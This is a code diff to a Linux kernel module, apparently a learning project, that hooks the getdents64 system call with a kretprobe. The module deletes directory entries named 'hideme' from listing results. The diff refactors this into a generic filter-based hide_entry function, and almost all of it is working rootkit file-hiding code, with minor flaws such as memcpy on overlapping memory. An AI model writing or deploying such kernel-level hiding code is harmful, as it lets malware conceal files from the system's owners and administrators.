@@ -9,6 +9,18 @@
 #include <linux/dirent.h>
 #include <linux/string.h>
 
+/// const file name to hide
+const char* hide_file_name = "hideme";
+
+typedef bool (*entry_filter_t)(struct linux_dirent64*);
+
+/// hide directory entries from result buffer
+/// @buffer is the result buffer to store @refitem linux_dirent64
+/// @size of buffer in bytes
+/// @return new buffer size
+static unsigned long hide_entry(void* buffer, unsigned long size, entry_filter_t entryFilter);
+
+
 static struct kretprobe kretp = {
         .maxactive = 20
 };
@@ -19,7 +31,13 @@ struct getdent64_arguments {
     unsigned int count;
 };
 
-const char* hide_file_name = "hideme";
+static bool hide_entry_by_name(struct linux_dirent64* entry){
+    if(strcmp(entry->d_name, hide_file_name) == 0){
+        return true;
+    }
+    return false;
+}
+
 
 static int handler_pre(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
@@ -46,32 +64,8 @@ static int handle_post(struct kretprobe_instance *ri, struct pt_regs *regs)
     struct getdent64_arguments* args = (struct getdent64_arguments*) ri->data;
     unsigned long retval = regs_return_value(regs);
 
-    unsigned long offset = 0;
-
-    unsigned long hide_entry_offset = 0;
-    unsigned long hide_entry_size = 0;
-
-    // find entry to hide
-    while(offset < retval){
-        struct linux_dirent64* current_ent = (struct linux_dirent64* )(args->buffer_ptr + offset);
-        if(strcmp(current_ent->d_name, hide_file_name) == 0){
-            hide_entry_offset = offset;
-            hide_entry_size = current_ent->d_reclen;
-            break;
-        }
-        offset += current_ent->d_reclen;
-    }
-
-    if(hide_entry_offset) {
-        // offset     2
-        // nextOffset 3
-        // [0, 1, 2, 3, 4]
-        // -----[        ] dest
-        // --------[     ] source
-        memcpy(args->buffer_ptr + offset,  args->buffer_ptr + offset + hide_entry_size, (retval - offset - hide_entry_size));
-        regs_set_return_value(regs, retval - hide_entry_size);
-    }
-
+    unsigned int new_size = hide_entry(args->buffer_ptr, retval, hide_entry_by_name);
+    regs_set_return_value(regs, new_size);
     return 0;
 }
 
@@ -103,3 +97,35 @@ module_exit(cleanup)
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Yarin");
 MODULE_DESCRIPTION("Test Module");
+
+
+
+unsigned long hide_entry(void* buffer, unsigned long size, entry_filter_t entryFilter){
+    unsigned long offset = 0;
+
+    unsigned long hide_entry_offset = -1;
+    unsigned long hide_entry_size = 0;
+
+    // find entry to hide
+    while(offset < size){
+        struct linux_dirent64* current_ent = (struct linux_dirent64* )(buffer + offset);
+        if(entryFilter(current_ent)){
+            hide_entry_offset = offset;
+            hide_entry_size = current_ent->d_reclen;
+            break;
+        }
+        offset += current_ent->d_reclen;
+    }
+
+    if(hide_entry_offset > 0) {
+        // offset     2
+        // nextOffset 3
+        // [0, 1, 2, 3, 4]
+        // -----[        ] dest
+        // --------[     ] source
+        memcpy(buffer + offset,  buffer + offset + hide_entry_size, (size - offset - hide_entry_size));
+        return size - hide_entry_size;
+    }
+
+    return size;
+}
